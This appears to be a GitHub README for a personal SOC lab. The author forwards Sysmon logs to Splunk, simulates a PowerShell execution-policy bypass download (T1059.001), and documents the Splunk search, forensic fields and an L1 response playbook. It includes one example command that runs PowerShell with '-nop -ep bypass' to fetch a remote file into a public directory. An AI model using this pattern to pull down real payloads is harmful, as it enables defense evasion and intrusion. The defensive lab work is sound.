# 🖥️ Endpoint Detection & Log Pipeline Analysis (Sysmon → Splunk)

> **Building an enterprise log ingestion pipeline and detecting a PowerShell execution-policy bypass (MITRE ATT&CK T1059.001) in Splunk Enterprise.**

---

## 📌 Project Overview

This project demonstrates the end-to-end implementation of an enterprise-grade log ingestion pipeline and the subsequent security analysis of a simulated endpoint attack.

By configuring **Microsoft Sysmon** on a target Windows 10 VM, forwarding logs to a centralized **Splunk Enterprise** SIEM on my Windows 11 host machine, and executing a simulated PowerShell execution policy bypass technique, I successfully captured, analyzed, and documented critical forensic artifacts.

---

## 📂 Access the Full Project Report

📄 **[Download / View the Complete Project Report](./Ranjit_Singh_SOC_Project.pdf)**

---

## 🛠️ Technologies & Tools Used

| Component | Technology |
| :--- | :--- |
| **SIEM** | Splunk Enterprise (Indexer / Search Head) |
| **Endpoint Telemetry** | Microsoft Sysmon (SwiftOnSecurity Configuration) |
| **Log Transport** | Splunk Universal Forwarder (Port 9997 TCP) |
| **Hypervisor** | Oracle VM VirtualBox |
| **Target OS** | Windows 10 Pro (VM) — `DESKTOP-S7EO8FC` |
| **Host / Collector OS** | Windows 11 Pro (Physical Host) |
| **Simulated Threat** | PowerShell Execution Policy Bypass (MITRE ATT&CK T1059.001, T1562.001) |

---

## 📐 Lab Architecture & Log Flow

```text
+------------------------------------------+                              +-----------------------------------------+
|             WINDOWS 10 VM                |      Port 9997 (TCP)         |            WINDOWS 11 HOST              |
|        (Target Host / Forwarder)         |  ------------------------->  |          (SIEM Host / Collector)        |
|                                          |                              |                                         |
|  [Sysmon Operational Event Logs]         |                              |  [Splunk Enterprise Instance]           |
|  [Splunk Universal Forwarder Service]    |                              |  [Centralized Indexer & Search Head]    |
+------------------------------------------+                              +-----------------------------------------+
```

---

## ⚡ The Simulation (PowerShell Evasion)

To simulate a defense evasion technique commonly used in phishing campaigns, I ran an elevated command on the Windows 10 VM designed to bypass execution policies (`-ep bypass`) and silently download an external payload to a public directory:

```powershell
powershell.exe -nop -ep bypass -c "Invoke-WebRequest -Uri 'https://www.google.com' -OutFile 'C:\Users\Public\google_test.txt'"
```

**Why this matters:** threat actors frequently use this exact pattern after initial phishing access — spawning a command interpreter with bypassed execution parameters to pull tooling down from a remote C2 server.

---

## 🔍 SOC Analyst Investigation in Splunk

As a SOC Analyst, I built a high-fidelity search query in Splunk to hunt for the download artifact:

```spl
index=* "google_test.txt"
```

### Key Forensic Artifacts Extracted

| Forensic Field | Discovered Value | Security Relevance |
| :--- | :--- | :--- |
| **Target Endpoint** | `DESKTOP-S7EO8FC` | Confirms the exact endpoint executing the command |
| **Source Log Pathway** | `WinEventLog:Microsoft-Windows-Sysmon/Operational` (Event ID 1) | Validates Sysmon captured process-level activity |
| **Initiating Executable** | `PowerShell.EXE` | Identifies the true system tool used to download the file |
| **Evasion Parameter** | `-ep bypass` | Execution Policy Bypass — strong indicator of intentional defense evasion |
| **Current Directory** | `C:\Windows\system32\` | Payload spawned with privileged system context |
| **Parent Process** | `cmd.exe` | Establishes parent-child hierarchy — PowerShell spawned from a console |

---

## 🛡️ Incident Response Playbook (L1 SOC Workflow)

If detected in production, the L1 SOC Analyst workflow includes:

1. **Alert Triage & Validation** — Categorize as **High Severity** due to the `-ep bypass` flag, which strongly indicates intentional defense evasion.
2. **Network Isolation** — Isolate host `DESKTOP-S7EO8FC` immediately via EDR to prevent lateral movement.
3. **Process Termination** — Kill the active process IDs (PIDs) associated with the malicious execution string.
4. **Eradication** — Locate, analyze in a sandbox, and safely delete the downloaded `google_test.txt` file from `C:\Users\Public\`.
5. **Host Hardening** — Enforce AppLocker/WDAC policy controls to block non-administrative execution of PowerShell.

---

## 🎓 Key Takeaways & Skills Proven

- **SIEM Engineering:** Successfully configured and validated a functional remote log ingestion pipeline from scratch
- **Forensic Auditing:** Demonstrated working knowledge of Sysmon Event ID 1 (Process Creation) and forensic telemetry fields
- **Threat Mitigation:** Translated raw alerts into structured containment, eradication and hardening steps
- **Detection Fidelity:** Built targeted SPL searches to isolate a single high-value artifact from noisy index data

---

## 👤 Connect with Me

**Author:** Ranjit Singh — CompTIA Security+ (SY0-701) Certified
**LinkedIn:** [linkedin.com/in/ranjit-singh-a878a93b9](https://www.linkedin.com/in/ranjit-singh-a878a93b9)
**GitHub:** [github.com/RanjitSingh-SOC1](https://github.com/RanjitSingh-SOC1)
